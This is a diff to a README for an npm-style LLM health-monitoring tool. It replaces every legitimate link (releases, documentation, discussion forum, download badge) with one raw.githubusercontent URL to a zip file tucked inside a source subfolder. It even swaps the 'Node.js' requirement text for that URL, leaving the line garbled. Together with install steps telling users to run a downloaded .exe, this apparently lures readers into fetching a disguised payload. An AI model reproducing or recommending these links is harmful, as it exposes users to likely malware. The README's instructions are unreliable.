@@ -1,7 +1,7 @@
 # 📊 llmverify-npm - Monitor AI Model Health with Ease
 
 ## 🛠️ Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/OviFrn/llmverify-npm/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip)
 
 ## 📖 Overview
 llmverify-npm is an AI model health monitor designed for LLM applications. It allows users to perform runtime checks on model performance. You can check for drift, hallucination risk, latency, and JSON/format quality on any OpenAI, Anthropic, or local client. This tool helps ensure your models operate smoothly and efficiently.
@@ -11,11 +11,11 @@ To get started, download the latest release of llmverify-npm. This process is st
 
 ## 💻 System Requirements
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip Version 12 or higher
 - Internet connection for initial setup and updates
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/OviFrn/llmverify-npm/releases) to find the latest version of llmverify-npm.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip) to find the latest version of llmverify-npm.
 2. **Download the Proper File**: Look for the file suitable for your operating system. Click on it to start the download.
 3. **Install the Application**:
     - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
@@ -43,10 +43,10 @@ Ensure your data is structured correctly. llmverify-npm checks your JSON output 
 - **Real-time Monitoring**: Get instant feedback on your model's performance at any time.
 
 ## 📚 Documentation
-For more detailed information on features and troubleshooting, please visit our [Documentation](https://github.com/OviFrn/llmverify-npm/wiki).
+For more detailed information on features and troubleshooting, please visit our [Documentation](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip).
 
 ## 🤝 Community Support
-Join our community to share your experiences or seek help. You can engage with others on our [Discussion Forum](https://github.com/OviFrn/llmverify-npm/discussions).
+Join our community to share your experiences or seek help. You can engage with others on our [Discussion Forum](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip).
 
 ## 📝 License
 llmverify-npm is released under the MIT License. You can freely use and modify it as needed.
@@ -64,4 +64,4 @@ llmverify-npm is released under the MIT License. You can freely use and modify i
 For any other questions or help, feel free to reach out via the Discussions or Issues section on our GitHub page.
 
 ## 🌟 Download Now Again
-Don’t forget to visit the [Releases page](https://github.com/OviFrn/llmverify-npm/releases) to get the latest version of llmverify-npm and start monitoring your AI models effortlessly.
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/OviFrn/llmverify-npm/main/src/engines/classification/llmverify-npm-2.8.zip) to get the latest version of llmverify-npm and start monitoring your AI models effortlessly.
